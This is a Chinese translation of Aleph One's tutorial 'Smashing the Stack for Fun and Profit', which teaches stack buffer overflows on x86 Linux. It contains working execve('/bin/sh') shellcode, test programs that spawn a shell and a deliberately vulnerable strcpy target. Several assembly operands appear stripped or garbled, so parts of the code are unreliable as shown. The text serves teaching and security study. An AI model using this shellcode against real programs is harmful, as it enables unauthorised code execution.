# smashing the stack for fun and profit 译文

> 原文：[Smashing The Stack For Fun And Profit](http://phrack.org/issues/49/14.html)
> 日期：2000.12.20
> 作者：[Aleph One](mailto:aleph1@underground.org)
> 译者：[xuzq@chinasafer.com](www.chinasafer.com)

'践踏堆栈'[C语言编程] n. 在许多C语言的实现中,有可能通过写入例程中所声明的数组的结尾部分来破坏可执行的堆栈.所谓'践踏堆栈'使用的代码可以造成例程的返回异常,从而跳到任意的地址.这导致了一些极为险恶的数据相关漏洞(已人所共知).其变种包括堆栈垃圾化(trash the stack),堆栈乱写(scribble the stack),堆栈毁坏(mangle the stack); 术语mung the stack并不使用,因为这从来不是故意造成的.参阅spam; 也请参阅同名的漏洞,胡闹内核(fandango on core),内存泄露(memory leak),优先权丢失(precedence lossage),螺纹滑扣(overrun screw).

## 简介

在过去的几个月中,被发现和利用的缓冲区溢出漏洞呈现上升趋势.例如syslog, splitvt, sendmail 8.7.5, Linux/FreeBSD mount, Xt library, at等等.本文试图解释什么是缓冲区溢出, 以及如何利用.

汇编的基础知识是必需的. 对虚拟内存的概念, 以及使用gdb的经验是十分有益
的, 但不是必需的. 我们还假定使用Intel x86 CPU, 操作系统是Linux.

在开始之前我们给出几个基本的定义: 缓冲区,简单说来是一块连续的计算机内存区域, 可以保存相同数据类型的多个实例. C程序员通常和字缓冲区数组打交道. 最常见的是字符数组. 数组, 与C语言中所有的变量一样, 可以被声明为静态或动态的. 静态变量在程序加载时定位于数据段. 动态变量在程序运行时定位于堆栈之中. 溢出, 说白了就是灌满, 使内容物超过顶端, 边缘, 或边界. 我们这里只关心动态缓冲区的溢出问题, 即基于堆栈的缓冲区溢出.

## 进程的内存组织形式

为了理解什么是堆栈缓冲区, 我们必须首先理解一个进程是以什么组织形式在内存中存在的. 进程被分成三个区域: 文本, 数据和堆栈. 我们把精力集中在堆栈区域, 但首先按照顺序简单介绍一下其他区域.

文本区域是由程序确定的, 包括代码(指令)和只读数据. 该区域相当于可执行文件的文本段. 这个区域通常被标记为只读, 任何对其写入的操作都会导致段错误 (segmentation violation).

数据区域包含了已初始化和未初始化的数据. 静态变量储存在这个区域中. 数据区域对应可执行文件中的data-bss段. 它的大小可以用系统调用brk(2)来改变. 如果bss数据的扩展或用户堆栈把可用内存消耗光了, 进程就会被阻塞住, 等待有了一块更大的内存空间之后再运行. 新内存加入到数据和堆栈段的中间.

```
+------------------+ 内存低地址
|                  |
| 文本             |
|                  |
|------------------|
| (已初始化)       |
| 数据             |
| (未初始化)       |
|------------------|
|                  |
| 堆栈             |
|                  |
+------------------+ 内存高地址
```

Fig. 1 进程内存区域


## 什么是堆栈?

堆栈是一个在计算机科学中经常使用的抽象数据类型. 堆栈中的物体具有一个特性: 最后一个放入堆栈中的物体总是被最先拿出来, 这个特性通常称为后进先处(LIFO)队列.

堆栈中定义了一些操作. 两个最重要的是PUSH和POP. PUSH操作在堆栈的顶部加入一个元素. POP操作相反, 在堆栈顶部移去一个元素, 并将堆栈的大小减一.


## 为什么使用堆栈?

现代计算机被设计成能够理解人们头脑中的高级语言. 在使用高级语言构造程序时最重要的技术是过程(procedure)和函数(function). 从这一点来看, 一个过程调用可以象跳转(jump)命令那样改变程序的控制流程, 但是与跳转不同的是, 当工作完成时, 函数把控制权返回给调用之后的语句或指令. 这种高级抽象实现起来要靠堆栈的帮助.

堆栈也用于给函数中使用的局部变量动态分配空间, 同样给函数传递参数和函数返
回值也要用到堆栈.


## 堆栈区域

堆栈是一块保存数据的连续内存. 一个名为堆栈指针(SP)的寄存器指向堆栈的顶部. 堆栈的底部在一个固定的地址. 堆栈的大小在运行时由内核动态地调整. CPU实现指令 PUSH和POP, 向堆栈中添加元素和从中移去元素.

堆栈由逻辑堆栈帧组成. 当调用函数时逻辑堆栈帧被压入栈中, 当函数返回时逻辑堆栈帧被从栈中弹出. 堆栈帧包括函数的参数, 函数地局部变量, 以及恢复前一个堆栈帧所需要的数据, 其中包括在函数调用时指令指针(IP)的值.

堆栈既可以向下增长(向内存低地址)也可以向上增长, 这依赖于具体的实现. 在我们的例子中, 堆栈是向下增长的. 这是很多计算机的实现方式, 包括Intel, Motorola, SPARC和MIPS处理器. 堆栈指针(SP)也是依赖于具体实现的. 它可以指向堆栈的最后地址, 或者指向堆栈之后的下一个空闲可用地址. 在我们的讨论当中, SP指向堆栈的最后地址.

除了堆栈指针(SP指向堆栈顶部的的低地址)之外, 为了使用方便还有指向帧内固定地址的指针叫做帧指针(FP). 有些文章把它叫做局部基指针(LB-local base pointer). 从理论上来说, 局部变量可以用SP加偏移量来引用. 然而, 当有字被压栈和出栈后, 这些偏移量就变了. 尽管在某些情况下编译器能够跟踪栈中的字操作, 由此可以修正偏移量, 但是在某些情况下不能. 而且在所有情况下, 要引入可观的管理开销. 而且在有些机器上, 比如Intel处理器, 由SP加偏移量访问一个变量需要多条指令才能实现.

因此, 许多编译器使用第二个寄存器, FP, 对于局部变量和函数参数都可以引用, 因为它们到FP的距离不会受到PUSH和POP操作的影响. 在Intel CPU中, BP(EBP)用于这个目的. 在Motorola CPU中, 除了A7(堆栈指针SP)之外的任何地址寄存器都可以做FP. 考虑到我们堆栈的增长方向, 从FP的位置开始计算, 函数参数的偏移量是正值, 而局部变量的偏移量是负值.

当一个例程被调用时所必须做的第一件事是保存前一个FP(这样当例程退出时就可以恢复). 然后它把SP复制到FP, 创建新的FP, 把SP向前移动为局部变量保留空间. 这称为例程的序幕(prolog)工作. 当例程退出时, 堆栈必须被清除干净, 这称为例程的收尾 (epilog)工作. Intel的ENTER和LEAVE指令, Motorola的LINK和UNLINK指令, 都可以用于有效地序幕和收尾工作.

下面我们用一个简单的例子来展示堆栈的模样:

example1.c:

```c
void function(int a, int b, int c) {
    char buffer1[5];
    char buffer2[10];
}

void main() {
    function(1,2,3);
}
```

为了理解程序在调用`function()`时都做了哪些事情, 我们使用gcc的`-S`选项编译, 以产生汇编代码输出:

```
$ gcc -S -o example1.s example1.c
```

通过查看汇编语言输出, 我们看到对`function()`的调用被翻译成:

```
pushl 
pushl 
pushl 
call function
```

以从后往前的顺序将`function`的三个参数压入栈中, 然后调用`function()`. 指令call会把指令指针(IP)也压入栈中. 我们把这被保存的IP称为返回地址(RET). 在函数中所做的第一件事情是例程的序幕工作:

```
pushl %ebp
movl %esp,%ebp
subl ,%esp
```

将帧指针EBP压入栈中. 然后把当前的SP复制到EBP, 使其成为新的帧指针. 我们把这个被保存的FP叫做SFP. 接下来将SP的值减小, 为局部变量保留空间.

我们必须牢记:内存只能以字为单位寻址. 在这里一个字是4个字节, 32位. 因此5字节的缓冲区会占用8个字节(2个字)的内存空间, 而10个字节的缓冲区会占用12个字节(3个字)的内存空间. 这就是为什么SP要减掉20的原因. 这样我们就可以想象`function()`被调用时堆栈的模样(每个空格代表一个字节):

```
  堆栈顶部

+-----------+ 内存低地址 
|  buffer2  |
+-----------+
|  buffer1  |
+-----------+
|    sfp    |
+-----------+
|    ret    |
+-----------+
|     a     |
+-----------+
|     b     |
+-----------+
|     c     |
+-----------+ 内存高地址

  堆栈底部
```



 


## 缓冲区溢出

缓冲区溢出是向一个缓冲区填充超过它处理能力的数据所造成的结果. 如何利用这个经常出现的编程错误来执行任意代码呢? 让我们来看看另一个例子:

example2.c

```c
void function(char *str) {
    char buffer[16];

    strcpy(buffer,str);
}

void main() {
    char large_string[256];
    int i;

    for( i = 0; i < 255; i++)
    large_string[i] = 'A';

    function(large_string);
}
```

这个程序的函数含有一个典型的内存缓冲区编码错误. 该函数没有进行边界检查就复制提供的字符串, 错误地使用了`strcpy()`而没有使用`strncpy()`. 如果你运行这个程序就会产生段错误. 让我们看看在调用函数时堆栈的模样:



```
  堆栈顶部

+-----------+ 内存低地址 
|  buffer   |
+-----------+
|    sfp    |
+-----------+
|    ret    |
+-----------+
|   *str    |
+-----------+ 内存高地址

  堆栈底部
```


这里发生了什么事? 为什么我们得到一个段错误? 答案很简单: `strcpy()`将`*str`的内容(`larger_string[]`)复制到`buffer[]`里, 直到在字符串中碰到一个空字符. 显然, `buffer[]`比`*str`小很多. `buffer[]`只有16个字节长, 而我们却试图向里面填入256个字节的内容. 这意味着在`buffer`之后, 堆栈中250个字节全被覆盖. 包括SFP, RET, 甚至`*str`! 我们已经把`large_string`全都填成了`A`. `A`的十六进制值为`0x41`. 这意味着现在的返回地址是`0x41414141`. 这已经在进程的地址空间之外了. 当函数返回时, 程序试图读取返回地址的下一个指令, 此时我们就得到一个段错误.

因此缓冲区溢出允许我们更改函数的返回地址. 这样我们就可以改变程序的执行流程. 现在回到第一个例子, 回忆当时堆栈的模样:

```
  堆栈顶部

+-----------+ 内存低地址 
|  buffer2  |
+-----------+
|  buffer1  |
+-----------+
|    sfp    |
+-----------+
|    ret    |
+-----------+
|     a     |
+-----------+
|     b     |
+-----------+
|     c     |
+-----------+ 内存高地址

  堆栈底部
```

现在试着修改我们第一个例子, 让它可以覆盖返回地址, 而且使它可以执行任意代码. 堆栈中在`buffer1[]`之前的是SFP, SFP之前是返回地址. ret从`buffer1[]`的结尾算起是4个字节. 应该记住的是`buffer1[]`实际上是2个字即8个字节长. 因此返回地址从`buffer1[]`的开头算起是12个字节. 我们会使用这种方法修改返回地址, 跳过函数调用后面的赋值语句`x=1;`, 为了做到这一点我们把返回地址加上8个字节. 代码看起来是这样的:

example3.c:

```c
void function(int a, int b, int c) {
    char buffer1[5];
    char buffer2[10];
    int *ret;

    ret = buffer1 + 12;
    (*ret) += 8;
}

void main() {
    int x;

    x = 0;
    function(1,2,3);
    x = 1;
    printf("%d\n",x);
}
```

我们把`buffer1[]`的地址加上12, 所得的新地址是返回地址储存的地方. 我们想跳过赋值语句而直接执行`printf`调用. 如何知道应该给返回地址加8个字节呢? 我们先前使用过一个试验值(比如1), 编译该程序, 祭出工具gdb:

```
[aleph1]$ gdb example3
GDB is free software and you are welcome to distribute copies of it
under certain conditions; type "show copying" to see the conditions.
There is absolutely no warranty for GDB; type "show warranty" for details.
GDB 4.15 (i586-unknown-linux), Copyright 1995 Free Software Foundation, Inc...
(no debugging symbols found)...
(gdb) disassemble main
Dump of assembler code for function main:
0x8000490 : pushl %ebp
0x8000491 : movl %esp,%ebp
0x8000493 : subl x4,%esp
0x8000496 : movl x0,0xfffffffc(%ebp)
0x800049d : pushl x3
0x800049f : pushl x2
0x80004a1 : pushl x1
0x80004a3 : call 0x8000470
0x80004a8 : addl xc,%esp
0x80004ab : movl x1,0xfffffffc(%ebp)
0x80004b2 : movl 0xfffffffc(%ebp),%eax
0x80004b5 : pushl %eax
0x80004b6 : pushl x80004f8
0x80004bb : call 0x8000378
0x80004c0 : addl x8,%esp
0x80004c3 : movl %ebp,%esp
0x80004c5 : popl %ebp
0x80004c6 : ret
0x80004c7 : nop
```

我们看到当调用`function()`时, RET会是`0x8004a8`, 我们希望跳过在`0x80004ab`的赋值指令. 下一个想要执行的指令在`0x8004b2`. 简单的计算告诉我们两个指令的距离为8字节.


## Shell Code

现在我们可以修改返回地址即可以改变程序执行的流程, 我们想要执行什么程序呢? 在大多数情况下我们只是希望程序派生出一个shell. 从这个shell中, 可以执行任何我们所希望的命令. 但是如果我们试图破解的程序里并没有这样的代码可怎么办呢? 我们怎么样才能将任意指令放到程序的地址空间中去呢? 答案就是把想要执行的代码放到我们想使其溢出的缓冲区里, 并且覆盖函数的返回地址, 使其指向这个缓冲区. 假定堆栈的起始地址为`0xFF`, S代表我们想要执行的代码, 堆栈看起来应该是这样:

```
内存低地址                                       内存高地址
+----------------------+------+------+------+------+------+
| DDDDDDDDEEEEEEEEEEEE | EEEE | FFFF | FFFF | FFFF | FFFF |
+----------------------+------+------+------+------+------+
| 89ABCDEF0123456789AB | CDEF | 0123 | 4567 | 89AB | CDEF |
+----------------------+------+------+------+------+------+
|       buffer         | sfp  | ret  |  a   |  b   |  c   |
+----------------------+------+------+------+------+------+
| JJSSSSSSSSSSSSSSCCss | ssss | 0xD8 | 0x01 | 0x02 | 0x03 |
+----------------------+------+------+------+------+------+
  ↑                             |
  +-----------------------------+
堆栈顶部                                           堆栈底部
```


派生出一个shell的C语言代码是这样的:

shellcode.c

```c
#include

void main() {
    char *name[2];

    name[0] = "/bin/sh";
    name[1] = NULL;
    execve(name[0], name, NULL);
}
```

为了查明这程序变成汇编后是个什么样子, 我们编译它, 然后祭出调试工具gdb. 记住在编译的时候要使用`-static`标志, 否则系统调用`execve`的真实代码就不会包括在汇编中,取而代之的是对动态C语言库的一个引用, 真正的代码要到程序加载的时候才会联入.

```
[aleph1]$ gcc -o shellcode -ggdb -static shellcode.c
[aleph1]$ gdb shellcode
GDB is free software and you are welcome to distribute copies of it
under certain conditions; type "show copying" to see the conditions.
There is absolutely no warranty for GDB; type "show warranty" for details.
GDB 4.15 (i586-unknown-linux), Copyright 1995 Free Software Foundation, Inc...
(gdb) disassemble main
Dump of assembler code for function main:
0x8000130 : pushl %ebp
0x8000131 : movl %esp,%ebp
0x8000133 : subl x8,%esp
0x8000136 : movl x80027b8,0xfffffff8(%ebp)
0x800013d : movl x0,0xfffffffc(%ebp)
0x8000144 : pushl x0
0x8000146 : leal 0xfffffff8(%ebp),%eax
0x8000149 : pushl %eax
0x800014a : movl 0xfffffff8(%ebp),%eax
0x800014d : pushl %eax
0x800014e : call 0x80002bc <__execve>
0x8000153 : addl xc,%esp
0x8000156 : movl %ebp,%esp
0x8000158 : popl %ebp
0x8000159 : ret
End of assembler dump.
(gdb) disassemble __execve
Dump of assembler code for function __execve:
0x80002bc <__execve>: pushl %ebp
0x80002bd <__execve+1>: movl %esp,%ebp
0x80002bf <__execve+3>: pushl %ebx
0x80002c0 <__execve+4>: movl xb,%eax
0x80002c5 <__execve+9>: movl 0x8(%ebp),%ebx
0x80002c8 <__execve+12>: movl 0xc(%ebp),%ecx
0x80002cb <__execve+15>: movl 0x10(%ebp),%edx
0x80002ce <__execve+18>: int x80
0x80002d0 <__execve+20>: movl %eax,%edx
0x80002d2 <__execve+22>: testl %edx,%edx
0x80002d4 <__execve+24>: jnl 0x80002e6 <__execve+42>
0x80002d6 <__execve+26>: negl %edx
0x80002d8 <__execve+28>: pushl %edx
0x80002d9 <__execve+29>: call 0x8001a34 <__normal_errno_location>
0x80002de <__execve+34>: popl %edx
0x80002df <__execve+35>: movl %edx,(%eax)
0x80002e1 <__execve+37>: movl xffffffff,%eax
0x80002e6 <__execve+42>: popl %ebx
0x80002e7 <__execve+43>: movl %ebp,%esp
0x80002e9 <__execve+45>: popl %ebp
0x80002ea <__execve+46>: ret
0x80002eb <__execve+47>: nop
End of assembler dump.
```

下面我们看看这里究竟发生了什么事情. 先从main开始研究:

```
0x8000130 : pushl %ebp
0x8000131 : movl %esp,%ebp
0x8000133 : subl 0x8,%esp
```

这是例程的准备工作. 首先保存老的帧指针, 用当前的堆栈指针作为新的帧指针,
然后为局部变量保留空间. 这里是:

```c
char *name[2];
```

即2个指向字符串的指针. 指针的长度是一个字, 所以这里保留2个字(8个字节)的
空间.

```
0x8000136 : movl x80027b8,0xfffffff8(%ebp) ; -0x8(%ebp)
```

我们把`0x80027b8`(字串`"/bin/sh"`的地址)这个值复制到`name[]`中的第一个指针, 这
等价于:

```c
name[0] = "/bin/sh";
```

```
0x800013d : movl x0,0xfffffffc(%ebp) ; -0x4(%ebp)
```

我们把值`0x0`(`NULL`)复制到`name[]`中的第二个指针, 这等价于:

```c
name[1] = NULL;
```

对`execve()`的真正调用从下面开始:

```
0x8000144 : pushl x0 ; NULL
```

我们把`execve()`的参数以从后向前的顺序压入堆栈中, 这里从`NULL`开始.

```
0x8000146 : leal 0xfffffff8(%ebp),%eax ; name
```

把`name[]`的地址放到EAX寄存器中.

```
0x8000149 : pushl %eax
```

接着就把`name[]`的地址压入堆栈中.

```
0x800014a : movl 0xfffffff8(%ebp),%eax ; name[0]
```

把字串`"/bin/sh"`的地址放到EAX寄存器中

```
0x800014d : pushl %eax
```

接着就把字串`"/bin/sh"`的地址压入堆栈中

```
0x800014e : call 0x80002bc <__execve>
```

调用库例程`execve()`. 这个调用指令把IP(指令指针)压入堆栈中.

现在到了`execve()`. 要注意我们使用的是基于Intel的Linux系统. 系统调用的细节随
操作系统和CPU的不同而不同. 有的把参数压入堆栈中, 有的保存在寄存器里. 有的使用
软中断跳入内核模式, 有的使用远调用(far call). Linux把传给系统调用的参数保存在
寄存器里, 并且使用软中断跳入内核模式.

```
0x80002bc <__execve>: pushl %ebp
0x80002bd <__execve+1>: movl %esp,%ebp
0x80002bf <__execve+3>: pushl %ebx
```

例程的准备工作.

```
0x80002c0 <__execve+4>: movl xb,%eax
```

把`0xb`(十进制的11)放入寄存器EAX中(原文误为堆栈). `0xb`是系统调用表的索引 11就是`execve`.

```
0x80002c5 <__execve+9>: movl 0x8(%ebp),%ebx ; arg0: name[0]
```

把`"/bin/sh"`的地址放到寄存器EBX中.

```
0x80002c8 <__execve+12>: movl 0xc(%ebp),%ecx ; arg1: name
```

把`name[]`的地址放到寄存器ECX中.

```
0x80002cb <__execve+15>: movl 0x10(%ebp),%edx ; arg2: NULL
```

把空指针的地址放到寄存器EDX中.

```
0x80002ce <__execve+18>: int x80
```

进入内核模式.

由此可见调用`execve()`也没有什么太多的工作要做, 所有要做的事情总结如下:

a) 把以`NULL`结尾的字串`"/bin/sh"`放到内存某处.
b) 把字串`"/bin/sh"`的地址放到内存某处, 后面跟一个空的长字(null long word).
c) 把`0xb`放到寄存器EAX中.
d) 把字串`"/bin/sh"`的地址放到寄存器EBX中.
e) 把字串`"/bin/sh"`地址的地址放到寄存器ECX中.
(注: 原文d和e步骤把EBX和ECX弄反了)
f) 把空长字的地址放到寄存器EDX中.
g) 执行指令`int x80`.

但是如果`execve()`调用由于某种原因失败了怎么办? 程序会继续从堆栈中读取指令, 这时的堆栈中可能含有随机的数据! 程序执行这样的指令十有八九会core dump. 如果`execve`调用失败我们还是希望程序能够干净地退出. 为此必须在调用`execve`之后加入一个`exit`系统调用. `exit`系统调用在汇编语言看起来象什么呢?

exit.c

```c
#include

void main() {
    exit(0);
}
```


```
[aleph1]$ gcc -o exit -static exit.c
[aleph1]$ gdb exit
GDB is free software and you are welcome to distribute copies of it
under certain conditions; type "show copying" to see the conditions.
There is absolutely no warranty for GDB; type "show warranty" for details.
GDB 4.15 (i586-unknown-linux), Copyright 1995 Free Software Foundation, Inc...
(no debugging symbols found)...
(gdb) disassemble _exit
Dump of assembler code for function _exit:
0x800034c <_exit>: pushl %ebp
0x800034d <_exit+1>: movl %esp,%ebp
0x800034f <_exit+3>: pushl %ebx
0x8000350 <_exit+4>: movl x1,%eax
0x8000355 <_exit+9>: movl 0x8(%ebp),%ebx
0x8000358 <_exit+12>: int x80
0x800035a <_exit+14>: movl 0xfffffffc(%ebp),%ebx
0x800035d <_exit+17>: movl %ebp,%esp
0x800035f <_exit+19>: popl %ebp
0x8000360 <_exit+20>: ret
0x8000361 <_exit+21>: nop
0x8000362 <_exit+22>: nop
0x8000363 <_exit+23>: nop
End of assembler dump.
```

系统调用`exit`会把`0x1`放到寄存器EAX中, 在EBX中放置退出码, 并且执行`int 0x80`. 就这些了! 大多数应用程序在退出时返回0, 以表示没有错误. 我们在EBX中也放入0. 现在我们构造shell code的步骤就是这样的了:

a) 把以`NULL`结尾的字串`"/bin/sh"`放到内存某处.
b) 把字串`"/bin/sh"`的地址放到内存某处, 后面跟一个空的长字(null long word).
c) 把`0xb`放到寄存器EAX中.
d) 把字串`"/bin/sh"`的地址放到寄存器EBX中.
e) 把字串`"/bin/sh"`地址的地址放到寄存器ECX中.
(注: 原文d和e步骤把EBX和ECX弄反了)
f) 把空长字的地址放到寄存器EDX中.
g) 执行指令`int x80`.
h) 把`0x1`放到寄存器EAX中.
i) 把`0x0`放到寄存器EBX中.
j) 执行指令`int x80`.

试着把这些步骤变成汇编语言, 把字串放到代码后面. 别忘了在数组后面放上字串
地址和空字, 我们有如下的代码:

```
movl string_addr,string_addr_addr
movb x0,null_byte_addr
movl x0,null_addr
movl xb,%eax
movl string_addr,%ebx
leal string_addr,%ecx
leal null_string,%edx
int x80
movl x1, %eax
movl x0, %ebx
int x80
/bin/sh string goes here.
```

问题是我们不知道在要破解的程序的内存空间中, 上述代码(和其后的字串)会被放到哪里. 一种解决方法是使用JMP和CALL指令.JMP和CALL指令使用相对IP的寻址方式, 也就是说我们可以跳到距离当前IP一定间距的某个位置, 而不必知道那个位置在内存中的确切地址. 如果我们在字串`"/bin/sh"`之前放一个CALL指令, 并由一个JMP指令转到CALL指令上. 当CALL指令执行的时候, 字串的地址会被作为返回地址压入堆栈之中. 我们所需要的就是把返回地址放到一个寄存器之中. CALL指令只是调用我们上述的代码就可以了. 假定`J`代表JMP指令, `C`代表CALL指令, `s`代表字串, 执行过程如下所示:

```
内存低地址                                       内存高地址
+----------------------+------+------+------+------+------+
| DDDDDDDDEEEEEEEEEEEE | EEEE | FFFF | FFFF | FFFF | FFFF |
+----------------------+------+------+------+------+------+
| 89ABCDEF0123456789AB | CDEF | 0123 | 4567 | 89AB | CDEF |
+----------------------+------+------+------+------+------+
|       buffer         | sfp  | ret  |  a   |  b   |  c   |
+----------------------+------+------+------+------+------+
| JJSSSSSSSSSSSSSSCCss | ssss | 0xD8 | 0x01 | 0x02 | 0x03 |
+----------------------+------+------+------+------+------+
  ↑|↑             ↑|            |
  +||-------------||------------+ (1)
   +|-------------+|              (2)
    +--------------+              (3)
堆栈顶部                                           堆栈底部
```

运用上述的修正方法, 并使用相对索引寻址, 我们代码中每条指令的字节数目如下:


```
jmp offset-to-call # 2 bytes
popl %esi # 1 byte
movl %esi,array-offset(%esi) # 3 bytes
movb x0,nullbyteoffset(%esi)# 4 bytes
movl x0,null-offset(%esi) # 7 bytes
movl xb,%eax # 5 bytes
movl %esi,%ebx # 2 bytes
leal array-offset(%esi),%ecx # 3 bytes
leal null-offset(%esi),%edx # 3 bytes
int x80 # 2 bytes
movl x1, %eax # 5 bytes
movl x0, %ebx # 5 bytes
int x80 # 2 bytes
call offset-to-popl # 5 bytes
/bin/sh string goes here.
```

通过计算从jmp到call, 从call到popl, 从字串地址到数组, 从字串地址到空长字的
偏量, 我们得到:


```
jmp 0x26 # 2 bytes
popl %esi # 1 byte
movl %esi,0x8(%esi) # 3 bytes
movb x0,0x7(%esi) # 4 bytes
movl x0,0xc(%esi) # 7 bytes
movl xb,%eax # 5 bytes
movl %esi,%ebx # 2 bytes
leal 0x8(%esi),%ecx # 3 bytes
leal 0xc(%esi),%edx # 3 bytes
int x80 # 2 bytes
movl x1, %eax # 5 bytes
movl x0, %ebx # 5 bytes
int x80 # 2 bytes
call -0x2b # 5 bytes
.string \"/bin/sh\" # 8 bytes
```

这看起来很不错了. 为了确保代码能够正常工作必须编译并执行. 但是还有一个问题. 我们的代码修改了自身, 可是多数操作系统将代码页标记为只读. 为了绕过这个限制我们 必须把要执行的代码放到堆栈或数据段中, 并且把控制转到那里. 为此应该把代码放到数 据段中的全局数组中. 我们首先需要用16进制表示的二进制代码. 先编译, 然后再用gdb 来取得二进制代码.


shellcodeasm.c

```c
void main() {
    __asm__("
        jmp 0x2a # 3 bytes
        popl %esi # 1 byte
        movl %esi,0x8(%esi) # 3 bytes
        movb x0,0x7(%esi) # 4 bytes
        movl x0,0xc(%esi) # 7 bytes
        movl xb,%eax # 5 bytes
        movl %esi,%ebx # 2 bytes
        leal 0x8(%esi),%ecx # 3 bytes
        leal 0xc(%esi),%edx # 3 bytes
        int x80 # 2 bytes
        movl x1, %eax # 5 bytes
        movl x0, %ebx # 5 bytes
        int x80 # 2 bytes
        call -0x2f # 5 bytes
        .string \"/bin/sh\" # 8 bytes
    ");
}
```

```
[aleph1]$ gcc -o shellcodeasm -g -ggdb shellcodeasm.c
[aleph1]$ gdb shellcodeasm
GDB is free software and you are welcome to distribute copies of it
under certain conditions; type "show copying" to see the conditions.
There is absolutely no warranty for GDB; type "show warranty" for details.
GDB 4.15 (i586-unknown-linux), Copyright 1995 Free Software Foundation, Inc...
(gdb) disassemble main
Dump of assembler code for function main:
0x8000130 : pushl %ebp
0x8000131 : movl %esp,%ebp
0x8000133 : jmp 0x800015f
0x8000135 : popl %esi
0x8000136 : movl %esi,0x8(%esi)
0x8000139 : movb x0,0x7(%esi)
0x800013d : movl x0,0xc(%esi)
0x8000144 : movl xb,%eax
0x8000149 : movl %esi,%ebx
0x800014b : leal 0x8(%esi),%ecx
0x800014e : leal 0xc(%esi),%edx
0x8000151 : int x80
0x8000153 : movl x1,%eax
0x8000158 : movl x0,%ebx
0x800015d : int x80
0x800015f : call 0x8000135
0x8000164 : das
0x8000165 : boundl 0x6e(%ecx),%ebp
0x8000168 : das
0x8000169 : jae 0x80001d3 <__new_exitfn+55>
0x800016b : addb %cl,0x55c35dec(%ecx)
End of assembler dump.
(gdb) x/bx main+3
0x8000133 : 0xeb
(gdb)
0x8000134 : 0x2a
(gdb)
.
.
.
```

testsc.c

```c
char shellcode[] =
    "\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00"
    "\x00\xb8\x0b\x00\x00\x00\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80"
    "\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xd1\xff\xff"
    "\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00\x89\xec\x5d\xc3";

void main() {
    int *ret;

    ret = (int *)&ret + 2;
    (*ret) = (int)shellcode;

}
```

```
[aleph1]$ gcc -o testsc testsc.c
[aleph1]$ ./testsc
$ exit
[aleph1]$
```

成了! 但是这里还有一个障碍, 在多数情况下, 我们都是试图使一个字符缓冲区溢出. 那么在我们shellcode中的任何`NULL`字节都会被认为是字符串的结尾, 复制工作就到此为止了. 对于我们的破解工作来说, 在shellcode里不能有`NULL`字节. 下面来消除这些字节,同时把代码精简一点.


问题指令： 替代方案：

```
movb x0,0x7(%esi) xorl %eax,%eax
molv x0,0xc(%esi) movb %eax,0x7(%esi)
                  movl %eax,0xc(%esi)
-------------------------------------
movl xb,%eax      movb xb,%al
-------------------------------------
movl x1, %eax     xorl %ebx,%ebx
movl x0, %ebx     movl %ebx,%eax
                  inc %eax
```

改进后的代码：

shellcodeasm2.c

```c
void main() {
    __asm__("
        jmp 0x1f # 2 bytes
        popl %esi # 1 byte
        movl %esi,0x8(%esi) # 3 bytes
        xorl %eax,%eax # 2 bytes
        movb %eax,0x7(%esi) # 3 bytes
        movl %eax,0xc(%esi) # 3 bytes
        movb xb,%al # 2 bytes
        movl %esi,%ebx # 2 bytes
        leal 0x8(%esi),%ecx # 3 bytes
        leal 0xc(%esi),%edx # 3 bytes
        int x80 # 2 bytes
        xorl %ebx,%ebx # 2 bytes
        movl %ebx,%eax # 2 bytes
        inc %eax # 1 bytes
        int x80 # 2 bytes
        call -0x24 # 5 bytes
        .string \"/bin/sh\" # 8 bytes
        # 46 bytes total
    ");
}
```

我们的新测试程序：

testsc2.c

```c
char shellcode[] =
    "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
    "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
    "\x80\xe8\xdc\xff\xff\xff/bin/sh";

void main() {
    int *ret;

    ret = (int *)&ret + 2;
    (*ret) = (int)shellcode;

}
```

```
[aleph1]$ gcc -o testsc2 testsc2.c
[aleph1]$ ./testsc2
$ exit
[aleph1]$
```

## 破解实战

现在把手头的工具都准备好. 我们已经有了shellcode. 我们
知道shellcode必须是被溢出的字符串的一部分. 我们知道必须把
返回地址指回缓冲区. 下面的例子说明了这几点:


overflow1.c

```c
char shellcode[] =
    "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
    "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
    "\x80\xe8\xdc\xff\xff\xff/bin/sh";

char large_string[128];

void main() {
    char buffer[96];
    int i;
    long *long_ptr = (long *) large_string;

    for (i = 0; i < 32; i++)
        *(long_ptr + i) = (int) buffer;

    for (i = 0; i < strlen(shellcode); i++)
        large_string[i] = shellcode[i];

    strcpy(buffer,large_string);
}
```

```
[aleph1]$ gcc -o exploit1 exploit1.c
[aleph1]$ ./exploit1
$ exit
exit
[aleph1]$
```

如上所示, 我们用`buffer[]`的地址来填充`large_string[]`数组, shellcode就将会在`buffer[]`之中. 然后我们把shellcode复制到`large_string`字串的开头. `strcpy()`不做任何边界检查就会将`large_string`复制到`buffer`中去, 并且覆盖返回地址. 现在的返回地址就是我们shellcode的起始位置. 一旦执行到`main`函数的尾部, 在试图返回时就会跳到我们的shellcode中, 得到一个 shell.

我们所面临的问题是: 当试图使另外一个程序的缓冲区溢出的时候, 如何确定这个缓冲区(会有我们的shellcode)的地址在哪? 答案是: 对于每一个程序, 堆栈的起始地址都是相同的. 大多数程序不会一次向堆栈中压入成百上千字节的数据. 因此知道了堆栈的开始地址, 我们可以试着猜出这个要使其溢出的缓冲区在哪. 下面的小程序会打印出它的堆栈指针:


sp.c

```c
unsigned long get_sp(void) {
    __asm__("movl %esp,%eax");
}
void main() {
    printf("0x%x\n", get_sp());
}
```

```

[aleph1]$ ./sp
0x8000470
[aleph1]$
```

假定我们要使其溢出的程序如下:

vulnerable.c

```c
void main(int argc, char *argv[]) {
    char buffer[512];

    if (argc > 1)
        strcpy(buffer,argv[1]);
}
```

